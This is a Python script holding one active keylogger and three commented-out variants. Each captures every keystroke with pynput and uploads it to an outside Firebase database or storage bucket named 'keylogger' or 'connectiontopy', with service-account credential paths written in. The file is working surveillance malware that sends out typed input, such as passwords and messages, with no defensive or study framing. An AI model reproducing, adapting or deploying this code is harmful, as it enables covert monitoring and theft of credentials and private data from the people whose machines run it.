# from pynput.keyboard import Listener
# import firebase_admin
# from firebase_admin import credentials, db

# cred = credentials.Certificate(r"C:\Users\user\Desktop\abcd1\keylogger-45992-firebase-adminsdk-tsl89-a8ddef23a6.json")  # Replace with your Firebase Admin SDK path
# firebase_admin.initialize_app(cred, {
#     'databaseURL': 'https://keylogger-45992-default-rtdb.firebaseio.com/'  # Replace with your Firebase Realtime Database URL
# })

# # Reference to the database path where you want to store the keylogger data
# ref = db.reference('keylogs')

# # Function to store keylog data in Firebase
# def writetofile(key):
#     letter = str(key).replace("'", "")
#     print(letter)
    
#     # Write keylog to Firebase
#     ref.push({'key': letter})

# # Start the listener to capture key presses
# with Listener(on_press=writetofile) as l:
#     l.join()





# -----------------------------------------------------------------------------------------------------------------


from pynput.keyboard import Key, Listener
import firebase_admin
from firebase_admin import credentials, db

cred = credentials.Certificate(r"C:\Users\user\Desktop\abcd1\keylogger-45992-firebase-adminsdk-tsl89-a8ddef23a6.json")  # Replace with your Firebase Admin SDK path
firebase_admin.initialize_app(cred, {
    'databaseURL': 'https://keylogger-45992-default-rtdb.firebaseio.com/'  # Replace with your Firebase Realtime Database URL
})

# Reference to the database path where you want to store the keylogger data
ref = db.reference('keylogs')

# Function to store keylog data in Firebase
def writetofile(key):
    if isinstance(key, Key):
        letter = str(key).replace("Key.", "")
    else:
        letter = key.char
    print(letter)

    # Write keylog to Firebase
    ref.push({'key': letter})

# Start the listener to capture key presses
with Listener(on_press=writetofile) as l:
    l.join()









# from pynput.keyboard import Listener
# import firebase_admin
# from firebase_admin import credentials, storage
# import os

# # Initialize Firebase Admin SDK
# cred = credentials.Certificate(r"C:\Users\user\Desktop\abcd1\connectiontopy-firebase-adminsdk-oj3dq-cd03e50037.json")  # Replace with your Firebase Admin SDK path
# firebase_admin.initialize_app(cred, {
#     'storageBucket': 'connectiontopy.appspot.com'  # Replace with your Firebase Storage bucket
# })

# # Create or open the log file
# log_file = r"C:\Users\user\Desktop\keylogs.txt"  # Path to local log file

# # Function to write keylog data to a local file
# def writetofile(key):
#     letter = str(key).replace("'", "")
#     print(letter)
    
#     with open(log_file, 'a') as f:  # Append mode
#         f.write(letter + "\n")

# # Function to upload the file to Firebase Storage
# def upload_to_firebase_storage():
#     bucket = storage.bucket()
#     blob = bucket.blob('keylogs/keylogs.txt')  # File path in Firebase Storage
#     blob.upload_from_filename(log_file)
#     print("File uploaded to Firebase Storage")

# # Start the listener to capture key presses
# with Listener(on_press=writetofile) as l:
#     l.join()

# # Upload the log file to Firebase Storage after the listener stops
# upload_to_firebase_storage()









# from pynput.keyboard import Listener
# import firebase_admin
# from firebase_admin import credentials, db
# import time

# # Firebase initialization
# cred = credentials.Certificate(r"C:\Users\user\Desktop\abcd1\connectiontopy-firebase-adminsdk-oj3dq-cd03e50037.json")  # Replace with your Firebase Admin SDK path
# firebase_admin.initialize_app(cred, {
#     'databaseURL': 'https://connectiontopy-default-rtdb.firebaseio.com/'  # Replace with your Firebase Realtime Database URL
# })

# # Reference to the database path where you want to store the keylogger data
# ref = db.reference('keylogs')

# # Create an empty list to store keylogs
# keylogs = []

# # Function to store keylog data in Firebase Realtime Database and append to list
# def writetofile(key):
#     letter = str(key).replace("'", "")
#     print(letter)
    
#     # Append key to the keylogs list
#     keylogs.append(letter)

# # Push the keylogs list to Firebase Realtime Database at once
# def upload_to_firebase():
#     timestamp = int(time.time())
#     ref.child(f'keylogs_{timestamp}').set({'keys': ''.join(keylogs)})
#     print(f"Uploaded keylogs to Firebase at timestamp: {timestamp}")

# # Start the listener to capture key presses
# try:
#     with Listener(on_press=writetofile) as l:
#         l.join()
# except KeyboardInterrupt:
#     # When the keylogger is interrupted, upload the list to Firebase Realtime Database
#     upload_to_firebase()
